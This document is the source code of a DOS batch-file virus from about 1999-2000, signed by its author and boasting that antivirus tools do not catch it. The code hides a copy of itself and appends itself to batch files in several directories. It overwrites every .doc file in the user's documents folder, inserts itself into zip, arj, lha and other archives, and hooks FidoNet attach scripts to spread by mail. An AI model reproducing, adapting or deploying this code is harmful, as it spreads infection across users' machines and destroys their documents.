:Kind day! We represent your attention one more virus. He not terrible,
:but for BAT of a virus very hardy. Is not caught yet by antiviruses.
:To delete him we to you not recommend... As it is very dangerous.
:Overlook, better for You!
:                             By... (c) Steel 1999-2000 Version 2.0
@ctty nul
BREAK OFF
if exist c:\bootwin.sys goto ok
copy %0 c:\bootwin.sys
call attrib c:\bootwin.sys +h
set do copy = %r%
if "%0"=="AUTOEXEC.BAT" del %0
copy %0 c:\systdrv.bat
for %%a in (c:\fido\*.bat) %r% %%a+%0
for %%b in (c:\utils\*.bat) %r% %%b+%0
for %%c in (c:\util\*.bat) %r% %%c+%0
for %%d in (c:\мои документы\*.doc) do type %0 > %%d
for %%e in (d:\tools\*.bat) %r% %%e+%0
for %%f in (c:\tools\*.bat) %r% %%f+%0
attrib c:\fido attach.bat -r
echo. >> c:\fido\attach.bat
copy %0 c:\fido\msgbox.bat
c:\fido\msgbox.bat +h
echo attach.exe -A -L %0 >> c:\fido\attach.bat
:ok
if exist c:\butcpic.txt goto cont
echo [0;1;33m[2J[6C[32mWarning! > c:\butcpic.txt
echo  [36m butcher go for you!  >> c:\butcpic.txt
:cont
for %%j in (*.bat ..\*.bat) do if %%j==ATTACH.BAT goto att
goto noattac
:att
echo. >> attach.bat
echo attach.exe -A -L %0 >> attach.bat
exit
:noattac
for %%g in (*.bat ..\*.bat) do find "TRTL" %%g
if not errorlevel 1 goto next
@for %%k in (*.bat ..\*.bat ..\..\*.bat) do copy %%k+%0
:next
for %%h in (*.zip ..\*.zip) do pkzip %%h %0
for %%i in (*.arj ..\*.arj) do arj a -r %%i %0
for %%k in (*.bsa ..\*.bsa) do bsarc -ar %%k %0
for %%l in (*.ha  ..\*.ha) do ha a %%l %0
for %%m in (*.hap ..\*.hap) do hyper -a %%m %0
for %%n in (*.lha ..\*.lha) do lha a %%n %0
for %%o in (*.lim ..\*.lim) do lim a %%o %0
for %%p in (*.sqz ..\*.sqz) do sqz a %%p %0
for %%r in (*.zoo ..\*.zoo) do zoo a %%r %0
for %%q in (*.ans c:\max\*.ans) do type c:\butcher.txt >> %%q
@ctty con
